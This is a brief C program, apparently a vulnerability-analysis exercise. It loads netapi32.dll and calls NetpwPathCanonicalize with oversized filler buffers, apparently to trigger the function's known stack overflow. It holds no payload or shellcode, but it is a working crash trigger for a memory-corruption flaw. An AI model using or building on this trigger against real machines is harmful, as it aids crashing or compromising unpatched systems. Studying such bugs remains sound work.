#include <windows.h>
// 1. 定义与目标函数匹配的函数指针类型
typedef int (__stdcall *PFN_NetpwPathCanonicalize)(
    char* PathName,
    char* Outbuf,
    int   OutbufLen,
    char* Prefix,
    long* PathType,
    int   Flags
);
int main()
{
	char arg_1[0x320];
	char arg_2[0x440];
	int arg_3=0x440;
	char arg_4[0x100];
	long arg_5=44;
	HMODULE LibHandle = LoadLibrary("./netapi32.dll");
	PFN_NetpwPathCanonicalize Func = (PFN_NetpwPathCanonicalize)GetProcAddress(LibHandle,"NetpwPathCanonicalize");
	memset(arg_1,0,sizeof(arg_1));
	memset(arg_1,'a',sizeof(arg_1)-2);
	memset(arg_4,0,sizeof(arg_4));
	memset(arg_4,'b',sizeof(arg_4)-2);
	(Func)(arg_1,arg_2,arg_3,arg_4,&arg_5,0);
	FreeLibrary(LibHandle);
	return 0;
}